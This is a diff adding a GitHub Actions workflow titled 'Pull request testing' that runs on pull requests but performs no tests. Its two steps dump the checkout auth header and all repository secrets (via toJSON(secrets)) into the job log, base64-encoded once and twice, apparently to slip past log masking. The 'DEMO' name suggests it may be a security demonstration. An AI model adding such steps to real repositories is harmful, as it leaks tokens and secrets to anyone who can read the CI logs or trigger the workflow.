@@ -1,0 +1,28 @@
+name: Pull request testing
+
+on:
+#  push:
+#   branches: [ master ]
+  pull_request:
+   branches: [ master ]
+
+jobs:
+  event-testing:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+# This seems to be more secure ... 
+      - name: trigger
+        run: |
+          echo "Triggered ..."
+          echo ------------
+          git config --get http.https://github.com/.extraheader | base64
+
+      - name: trigger2
+        env:
+          DEMO: ${{ toJSON(secrets) }}
+        run: |  
+          echo $DEMO | base64 | base64
